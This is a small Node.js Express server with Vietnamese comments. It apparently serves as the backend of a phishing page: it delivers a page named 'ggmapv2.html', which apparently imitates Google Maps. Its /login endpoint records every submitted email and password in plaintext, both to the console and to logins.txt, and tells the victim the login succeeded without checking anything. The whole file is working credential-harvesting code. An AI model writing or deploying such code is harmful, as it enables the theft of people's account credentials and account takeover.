const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const port = 3000;

app.use(express.json());
app.use(express.static('public')); // thư mục chứa index.html, script.js, style.css


app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'ggmapv2.html'));
});
app.post('/login', (req, res) => {
  const { email, password } = req.body;

  console.log('Thông tin đăng nhập:', email, password);

  // Lưu vào file logins.txt
  const logPath = path.join(__dirname, 'logins.txt');
  const logData = `Email: ${email}, Password: ${password}, Time: ${new Date().toLocaleString()}\n`;

  fs.appendFile(logPath, logData, (err) => {
    if (err) {
      console.error("Lỗi khi ghi file:", err);
      return res.status(500).json({ success: false, message: "Không thể ghi file" });
    }
    console.log("Đã lưu vào logins.txt");
    res.json({ success: true, message: "Đăng nhập thành công" });
  });
});

app.listen(port, () => {
  console.log(`Server đang chạy tại http://localhost:${port}`);
});
